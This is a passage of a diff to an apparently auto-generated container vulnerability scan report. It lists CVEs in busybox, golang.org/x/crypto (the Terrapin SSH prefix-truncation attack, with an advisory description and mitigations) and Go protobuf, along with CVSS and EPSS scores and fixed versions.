 ### Impact
 
 This attack targets the specification of ChaCha20-Poly1305 (chacha20-poly1305@openssh.com) and Encrypt-then-MAC (*-etm@openssh.com), which are widely adopted by well-known SSH implementations and can be considered de-facto standard. These algorithms can be practically exploited; however, in the case of Encrypt-Then-MAC, we additionally require the use of a CBC cipher. As a consequence, this attack works against all well-behaving SSH implementations supporting either of those algorithms and can be used to downgrade (but not fully strip) connection security in case SSH extension negotiation (RFC8308) is supported. The attack may also enable attackers to exploit certain implementation flaws in a man-in-the-middle (MitM) scenario.
+
+</blockquote>
+</details>
+</details></td></tr>
+
+<tr><td valign="top">
+<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>busybox</strong> <code>1.35.0-r17</code> (apk)</summary>
+
+<small><code>pkg:apk/alpine/busybox@1.35.0-r17?os_name=alpine&os_version=3.16</code></small><br/>
+<a href="https://scout.docker.com/v/CVE-2023-42366?s=alpine&n=busybox&ns=alpine&t=apk&osn=alpine&osv=3.16&vr=%3C1.35.0-r18"><img alt="medium : CVE--2023--42366" src="https://img.shields.io/badge/CVE--2023--42366-lightgrey?label=medium%20&labelColor=fbb552"/></a> 
+
+<table>
+<tr><td>Affected range</td><td><code>&lt;1.35.0-r18</code></td></tr>
+<tr><td>Fixed version</td><td><code>1.35.0-r18</code></td></tr>
+<tr><td>EPSS Score</td><td><code>0.024%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+
+
+</blockquote>
+</details>
+</details></td></tr>
+
+<tr><td valign="top">
+<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>golang.org/x/crypto</strong> <code>0.0.0-20220722155217-630584e8d5aa</code> (golang)</summary>
+
+<small><code>pkg:golang/golang.org/x/crypto@0.0.0-20220722155217-630584e8d5aa</code></small><br/>
+<a href="https://scout.docker.com/v/CVE-2023-48795?s=github&n=crypto&ns=golang.org%2Fx&t=golang&vr=%3C0.0.0-20231218163308-9d2ee975ef9f"><img alt="medium 5.9: CVE--2023--48795" src="https://img.shields.io/badge/CVE--2023--48795-lightgrey?label=medium%205.9&labelColor=fbb552"/></a> <i>Insufficient Verification of Data Authenticity</i>
+
+<table>
+<tr><td>Affected range</td><td><code>&lt;0.0.0-20231218163308-9d2ee975ef9f</code></td></tr>
+<tr><td>Fixed version</td><td><code>0.0.0-20231218163308-9d2ee975ef9f</code></td></tr>
+<tr><td>CVSS Score</td><td><code>5.9</code></td></tr>
+<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N</code></td></tr>
+<tr><td>EPSS Score</td><td><code>55.964%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>98th percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+### Summary
+
+Terrapin is a prefix truncation attack targeting the SSH protocol. More precisely, Terrapin breaks the integrity of SSH's secure channel. By carefully adjusting the sequence numbers during the handshake, an attacker can remove an arbitrary amount of messages sent by the client or server at the beginning of the secure channel without the client or server noticing it.
+
+### Mitigations
+
+To mitigate this protocol vulnerability, OpenSSH suggested a so-called "strict kex" which alters the SSH handshake to ensure a Man-in-the-Middle attacker cannot introduce unauthenticated messages as well as convey sequence number manipulation across handshakes.
+
+**Warning: To take effect, both the client and server must support this countermeasure.** 
+
+As a stop-gap measure, peers may also (temporarily) disable the affected algorithms and use unaffected alternatives like AES-GCM instead until patches are available.
+
+### Details
+
+The SSH specifications of ChaCha20-Poly1305 (chacha20-poly1305@openssh.com) and Encrypt-then-MAC (*-etm@openssh.com MACs) are vulnerable against an arbitrary prefix truncation attack (a.k.a. Terrapin attack). This allows for an extension negotiation downgrade by stripping the SSH_MSG_EXT_INFO sent after the first message after SSH_MSG_NEWKEYS, downgrading security, and disabling attack countermeasures in some versions of OpenSSH. When targeting Encrypt-then-MAC, this attack requires the use of a CBC cipher to be practically exploitable due to the internal workings of the cipher mode. Additionally, this novel attack technique can be used to exploit previously unexploitable implementation flaws in a Man-in-the-Middle scenario.
+
+The attack works by an attacker injecting an arbitrary number of SSH_MSG_IGNORE messages during the initial key exchange and consequently removing the same number of messages just after the initial key exchange has concluded. This is possible due to missing authentication of the excess SSH_MSG_IGNORE messages and the fact that the implicit sequence numbers used within the SSH protocol are only checked after the initial key exchange.
+
+In the case of ChaCha20-Poly1305, the attack is guaranteed to work on every connection as this cipher does not maintain an internal state other than the message's sequence number. In the case of Encrypt-Then-MAC, practical exploitation requires the use of a CBC cipher; while theoretical integrity is broken for all ciphers when using this mode, message processing will fail at the application layer for CTR and stream ciphers.
+
+For more details see [https://terrapin-attack.com](https://terrapin-attack.com). 
+
+### Impact
+
+This attack targets the specification of ChaCha20-Poly1305 (chacha20-poly1305@openssh.com) and Encrypt-then-MAC (*-etm@openssh.com), which are widely adopted by well-known SSH implementations and can be considered de-facto standard. These algorithms can be practically exploited; however, in the case of Encrypt-Then-MAC, we additionally require the use of a CBC cipher. As a consequence, this attack works against all well-behaving SSH implementations supporting either of those algorithms and can be used to downgrade (but not fully strip) connection security in case SSH extension negotiation (RFC8308) is supported. The attack may also enable attackers to exploit certain implementation flaws in a man-in-the-middle (MitM) scenario.
+
+</blockquote>
+</details>
+</details></td></tr>
+
+<tr><td valign="top">
+<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>golang.org/x/crypto</strong> <code>0.0.0-20220829220503-c86fa9a7ed90</code> (golang)</summary>
+
+<small><code>pkg:golang/golang.org/x/crypto@0.0.0-20220829220503-c86fa9a7ed90</code></small><br/>
+<a href="https://scout.docker.com/v/CVE-2023-48795?s=github&n=crypto&ns=golang.org%2Fx&t=golang&vr=%3C0.0.0-20231218163308-9d2ee975ef9f"><img alt="medium 5.9: CVE--2023--48795" src="https://img.shields.io/badge/CVE--2023--48795-lightgrey?label=medium%205.9&labelColor=fbb552"/></a> <i>Insufficient Verification of Data Authenticity</i>
+
+<table>
+<tr><td>Affected range</td><td><code>&lt;0.0.0-20231218163308-9d2ee975ef9f</code></td></tr>
+<tr><td>Fixed version</td><td><code>0.0.0-20231218163308-9d2ee975ef9f</code></td></tr>
+<tr><td>CVSS Score</td><td><code>5.9</code></td></tr>
+<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N</code></td></tr>
+<tr><td>EPSS Score</td><td><code>55.964%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>98th percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+### Summary
+
+Terrapin is a prefix truncation attack targeting the SSH protocol. More precisely, Terrapin breaks the integrity of SSH's secure channel. By carefully adjusting the sequence numbers during the handshake, an attacker can remove an arbitrary amount of messages sent by the client or server at the beginning of the secure channel without the client or server noticing it.
+
+### Mitigations
+
+To mitigate this protocol vulnerability, OpenSSH suggested a so-called "strict kex" which alters the SSH handshake to ensure a Man-in-the-Middle attacker cannot introduce unauthenticated messages as well as convey sequence number manipulation across handshakes.
+
+**Warning: To take effect, both the client and server must support this countermeasure.** 
+
+As a stop-gap measure, peers may also (temporarily) disable the affected algorithms and use unaffected alternatives like AES-GCM instead until patches are available.
+
+### Details
+
+The SSH specifications of ChaCha20-Poly1305 (chacha20-poly1305@openssh.com) and Encrypt-then-MAC (*-etm@openssh.com MACs) are vulnerable against an arbitrary prefix truncation attack (a.k.a. Terrapin attack). This allows for an extension negotiation downgrade by stripping the SSH_MSG_EXT_INFO sent after the first message after SSH_MSG_NEWKEYS, downgrading security, and disabling attack countermeasures in some versions of OpenSSH. When targeting Encrypt-then-MAC, this attack requires the use of a CBC cipher to be practically exploitable due to the internal workings of the cipher mode. Additionally, this novel attack technique can be used to exploit previously unexploitable implementation flaws in a Man-in-the-Middle scenario.
+
+The attack works by an attacker injecting an arbitrary number of SSH_MSG_IGNORE messages during the initial key exchange and consequently removing the same number of messages just after the initial key exchange has concluded. This is possible due to missing authentication of the excess SSH_MSG_IGNORE messages and the fact that the implicit sequence numbers used within the SSH protocol are only checked after the initial key exchange.
+
+In the case of ChaCha20-Poly1305, the attack is guaranteed to work on every connection as this cipher does not maintain an internal state other than the message's sequence number. In the case of Encrypt-Then-MAC, practical exploitation requires the use of a CBC cipher; while theoretical integrity is broken for all ciphers when using this mode, message processing will fail at the application layer for CTR and stream ciphers.
+
+For more details see [https://terrapin-attack.com](https://terrapin-attack.com). 
+
+### Impact
+
+This attack targets the specification of ChaCha20-Poly1305 (chacha20-poly1305@openssh.com) and Encrypt-then-MAC (*-etm@openssh.com), which are widely adopted by well-known SSH implementations and can be considered de-facto standard. These algorithms can be practically exploited; however, in the case of Encrypt-Then-MAC, we additionally require the use of a CBC cipher. As a consequence, this attack works against all well-behaving SSH implementations supporting either of those algorithms and can be used to downgrade (but not fully strip) connection security in case SSH extension negotiation (RFC8308) is supported. The attack may also enable attackers to exploit certain implementation flaws in a man-in-the-middle (MitM) scenario.
+
+</blockquote>
+</details>
+</details></td></tr>
+
+<tr><td valign="top">
+<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>google.golang.org/protobuf</strong> <code>1.28.1</code> (golang)</summary>
+
+<small><code>pkg:golang/google.golang.org/protobuf@1.28.1</code></small><br/>
+<a href="https://scout.docker.com/v/CVE-2024-24786?s=github&n=protobuf&ns=google.golang.org&t=golang&vr=%3C1.33.0"><img alt="medium 6.6: CVE--2024--24786" src="https://img.shields.io/badge/CVE--2024--24786-lightgrey?label=medium%206.6&labelColor=fbb552"/></a> <i>Loop with Unreachable Exit Condition ('Infinite Loop')</i>
+
+<table>
+<tr><td>Affected range</td><td><code>&lt;1.33.0</code></td></tr>
+<tr><td>Fixed version</td><td><code>1.33.0</code></td></tr>
+<tr><td>CVSS Score</td><td><code>6.6</code></td></tr>
+<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:U</code></td></tr>
+<tr><td>EPSS Score</td><td><code>0.231%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>46th percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+The protojson.Unmarshal function can enter an infinite loop when unmarshaling certain forms of invalid JSON. This condition can occur when unmarshaling into a message which contains a google.protobuf.Any value, or when the UnmarshalOptions.DiscardUnknown option is set.
 
 </blockquote>
 </details>
